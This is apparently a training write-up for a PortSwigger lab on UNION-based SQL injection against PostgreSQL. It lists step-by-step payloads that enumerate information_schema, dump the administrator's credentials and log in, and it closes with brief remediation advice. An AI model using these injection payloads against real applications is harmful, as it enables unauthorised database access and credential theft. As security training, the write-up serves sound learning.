# Lab 09 — SQL injection attack, listing the database contents on non-Oracle databases

| | |
|---|---|
| **Difficulty** | 🟨 Practitioner |
| **Category** | Examining the database |
| **Concept** | [08 — Examining the database](https://portswigger.net/web-security/sql-injection) |
| **PortSwigger** | https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle |

---

## 🎯 Objective
Enumerate the schema, find the users table (its name is randomized), extract the `administrator` credentials, and **log in**. Engine: **PostgreSQL** (non-Oracle → `information_schema`).

## 🧠 Background
Non-Oracle engines expose `information_schema.tables` and `information_schema.columns`. Because the lab randomizes table/column names, you must **enumerate**, not guess.

## 🪜 Methodology
1. Column count = **2**, both text (as prior UNION labs).
2. **List tables** — find the users-like table:
   ```
   ?category=Gifts' UNION SELECT table_name, NULL FROM information_schema.tables--
   ```
   → e.g. `users_abcdef`
3. **List that table's columns**:
   ```
   ?category=Gifts' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users_abcdef'--
   ```
   → e.g. `username_ghijkl`, `password_mnopqr`
4. **Dump the credentials**:
   ```
   ?category=Gifts' UNION SELECT username_ghijkl, password_mnopqr FROM users_abcdef--
   ```
5. Log in as `administrator` with the recovered password.

## 💥 Payload (step 4, using your instance's real names)
```
https://LAB-ID.web-security-academy.net/filter?category=Gifts'+UNION+SELECT+username_ghijkl,+password_mnopqr+FROM+users_abcdef--
```

## ✅ Why it works
`information_schema` is the SQL-standard metadata catalog. Querying it reveals the randomized identifiers, after which a normal `UNION SELECT` dumps the data.

## 🛡️ Remediation
Parameterize queries; restrict the app's DB user from reading `information_schema` where feasible; least privilege. See [16 — Prevention](https://portswigger.net/web-security/sql-injection).

## 🔑 Takeaway
Randomized names are no defense — enumerate `information_schema` → columns → data. `#sqli` `#practitioner` `#postgresql` `#schema-enum`
